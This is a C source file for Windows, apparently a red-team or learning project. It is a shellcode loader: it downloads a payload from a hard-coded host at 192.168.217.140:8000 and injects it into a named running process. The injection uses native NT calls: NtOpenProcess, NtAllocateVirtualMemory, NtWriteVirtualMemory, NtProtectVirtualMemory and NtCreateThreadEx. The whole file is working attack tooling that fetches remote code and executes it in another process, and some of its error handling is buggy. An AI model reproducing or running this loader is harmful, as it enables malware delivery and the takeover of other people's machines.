#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <TlHelp32.h>
#include "ntdll.h"



#pragma comment(lib, "ntdll")
#pragma comment (lib, "Wininet.lib")



#define RTL_MAX_DRIVE_LETTERS 32
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define PS_ATTRIBUTE_IMAGE_NAME PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)



SIZE_T sShellCodeSize = NULL;
PBYTE pShellCodeAddress = NULL;
NTSTATUS status = NULL;
HANDLE hProcess = NULL;



BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId) {

	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 Proc = { 0 };
	Proc.dwSize = sizeof(PROCESSENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32SnapShot failed\n");
		return EXIT_FAILURE;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("Process32First failed\n");
		NtClose(hSnapShot);
		return EXIT_FAILURE;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(LowerName, sizeof(LowerName));

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++) {
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				}
				LowerName[i++] = '\0';
			}
		}
		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));
}


BOOL FetchFile(IN SIZE_T* sShellCodeSize, IN PBYTE* pShellCodeAddress) {

	HINTERNET hInternet = NULL;
	HINTERNET hInternetFile = NULL;

	PBYTE pTmpBytes = NULL;
	PBYTE pBytes = NULL;

	DWORD dwBytesRead = NULL;
	BOOL bSTATE = TRUE;
	SIZE_T sSize = NULL;

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("InternetOpenW failed\n");
		return FALSE;
	}

	hInternetFile = InternetOpenUrl(hInternet, L"http://192.168.217.140:8000/test.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("InternetOpenUrlW failed\n");
		return FALSE;
	}
	
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

	if (pTmpBytes == NULL) {
		printf("Error allocating to pTmpBytes\n");
		NtClose(hInternet);
		NtClose(hInternetFile);
		return FALSE;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("InternetReadFile failed\n");
			bSTATE = FALSE;
			CloseHandle(hInternet);
			CloseHandle(hInternetFile);
			LocalFree(pTmpBytes);
		}

		sSize += dwBytesRead;

		if (pBytes == NULL) {
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (pBytes == NULL) {
			bSTATE = FALSE;
			CloseHandle(hInternet);
			CloseHandle(hInternetFile);
			LocalFree(pTmpBytes);
			LocalFree(pBytes);
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*sShellCodeSize = sSize;
	*pShellCodeAddress = pBytes;


	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

	HANDLE hThread = NULL;
	NTSTATUS status = NULL;
	LPVOID rBuffer = NULL;
	LPWSTR lpProcessName = NULL;
	DWORD CID = NULL;
	DWORD PID = NULL;
	SIZE_T numOfBytes = NULL;
	PBYTE shellcode = NULL;
	SIZE_T Size = NULL;
	OBJECT_ATTRIBUTES OA = { 0 };
	UNICODE_STRING US = { 0 };
	INITIAL_TEB IT = { 0 };
	CLIENT_ID CI = { 0 };
	ULONG uOldProtection = NULL;

	if (argc < 2) {
		printf("Too few arguments in terminal\n");
		return EXIT_FAILURE;
	}

	OA.Length = sizeof(OBJECT_ATTRIBUTES);
	OA.Attributes = 0x00000040L;


	if (!FetchFile(&Size, &shellcode)) {
		printf("failed to fetch file");
		return EXIT_FAILURE;
	}
	printf("successfully fetched file\n");

	printf("Finding process %s\n", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &PID)) {
		printf("Process not found");
		return EXIT_FAILURE;
	}

	CI.UniqueProcess = (HANDLE)PID;

	if ((status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CI)) != STATUS_SUCCESS) {
		printf("NtOpenProcess failed\n", status);
		return EXIT_FAILURE;
	}

	if ((status = NtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != STATUS_SUCCESS) {
		printf("NtAllocateVirutalMemory failed\n");
		NtClose(hProcess);
		return EXIT_FAILURE;
	}
	printf("successfully allocated virtual memory\n");

	if ((status = NtWriteVirtualMemory(hProcess, rBuffer, shellcode, Size, &numOfBytes)) != STATUS_SUCCESS) {
		printf("NtWriteVirtualMemory failed\n");
		NtClose(hProcess);
		LocalFree(rBuffer);
		return EXIT_FAILURE;
	}
	printf("successfully wrote to virtual memory\n");
	memset(shellcode, '\0', Size);

	if ((status = NtProtectVirtualMemory(hProcess, &rBuffer, &Size, PAGE_EXECUTE_READ, &uOldProtection)) != STATUS_SUCCESS) {
		printf("NtProtectVirtualMemory failed\n");
		NtClose(hProcess);
		LocalFree(rBuffer);
	}

	if ((status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL)) != STATUS_SUCCESS) {
		printf("NtCreateThreadEx failed\n");
		NtClose(hProcess);
		LocalFree(rBuffer);
		return EXIT_FAILURE;
	}
	printf("successfully created thread\n");
	printf("waiting for thread\n");

	if ((status = NtWaitForSingleObject(hThread, FALSE, NULL)) != STATUS_SUCCESS) {
		printf("NtWaitForSingleObject failed\n");
		NtClose(hProcess);
		NtClose(hThread);
		LocalFree(rBuffer);
		return EXIT_FAILURE;
	}

	NtClose(hProcess);
	NtClose(hThread);
	LocalFree(rBuffer);

	return EXIT_SUCCESS;
}